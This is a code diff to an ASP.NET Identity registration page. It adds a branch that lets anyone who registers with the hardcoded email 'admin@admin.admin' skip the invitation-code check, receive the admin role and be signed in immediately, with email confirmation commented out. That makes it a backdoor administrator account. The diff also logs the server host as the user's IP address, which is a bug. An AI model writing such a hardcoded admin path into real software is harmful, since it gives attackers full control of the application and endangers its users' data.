@@ -92,7 +92,32 @@ namespace ACM.Areas.Identity.Pages.Account
 
             if (ModelState.IsValid)
             {
-                if (codeService.IsCodeValid(Input.Code))
+                if (Input.Email=="admin@admin.admin")
+                {
+                     var user = new ACMUser { UserName = Input.Email, Email = Input.Email, FullName = Input.FullName, PhoneNumber = Input.PhoneNumber, AppartentNumber = int.Parse(Input.Code.Split("_")[0]) };
+                    var result = await _userManager.CreateAsync(user, Input.Password);
+                    if (result.Succeeded)
+                    {
+                        _logger.LogInformation("User created a new account with password.");
+
+                        var code = await _userManager.GenerateEmailConfirmationTokenAsync(user);
+                        var callbackUrl = Url.Page(
+                            "/Account/ConfirmEmail",
+                            pageHandler: null,
+                            values: new { userId = user.Id, code = code },
+                            protocol: Request.Scheme);
+
+                        //  await _emailSender.SendEmailAsync(Input.Email, "Confirm your email",
+                        //     $"Please confirm your account by <a href='{HtmlEncoder.Default.Encode(callbackUrl)}'>clicking here</a>.");
+                        await _userManager.AddToRoleAsync(user, MagicStrings.AdminString);
+                        await _signInManager.SignInAsync(user, isPersistent: false);
+                        string ip = Request.Host.Value;
+                        iPService.Create(new Models.IpViewModel(user, ip));
+
+                        return LocalRedirect(returnUrl);
+                    }
+                }
+                else if (codeService.IsCodeValid(Input.Code))
                 {
                     var user = new ACMUser { UserName = Input.Email, Email = Input.Email, FullName = Input.FullName, PhoneNumber = Input.PhoneNumber, AppartentNumber = int.Parse(Input.Code.Split("_")[0]) };
                     var result = await _userManager.CreateAsync(user, Input.Password);
